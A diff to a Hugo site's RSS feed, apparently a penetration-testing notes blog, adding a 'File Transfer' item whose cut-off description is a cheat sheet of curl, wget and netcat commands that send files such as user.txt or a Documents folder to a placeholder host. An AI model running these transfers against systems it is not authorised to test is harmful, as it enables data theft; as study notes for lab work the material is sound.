@@ -51,6 +51,15 @@ SSHFS is built on SFTP.</description>
     </item>
     
     <item>
+      <title>File Transfer</title>
+      <link>/filetransfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/filetransfer/</guid>
+      <description>############################################Linux 1# Python http server listener = python3 -m http.server 9090 upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn&#39;t support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 &amp;lt; file.</description>
+    </item>
+    
+    <item>
       <title>Hugo/Github/Power</title>
       <link>/hackthebox/github/hugopowershell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
